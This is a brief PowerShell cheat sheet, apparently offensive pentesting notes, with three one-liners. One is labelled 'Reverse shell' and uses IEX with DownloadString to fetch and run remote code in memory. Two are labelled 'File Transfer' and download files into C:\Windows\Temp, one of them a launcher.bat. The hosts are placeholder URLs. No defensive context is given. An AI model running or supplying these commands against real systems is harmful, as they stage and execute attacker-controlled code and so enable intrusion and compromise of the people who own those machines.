Reverse shell - IEX (New-Object Net.WebClient).DownloadString('URL');

File Transfer - (New-Object System.Net.WebClient).DownloadFile("URL", "C:\Windows\Temp\archive.zip")
File Transfer - Invoke-WebRequest "URL" -OutFile "C:\Windows\Temp\launcher.bat"
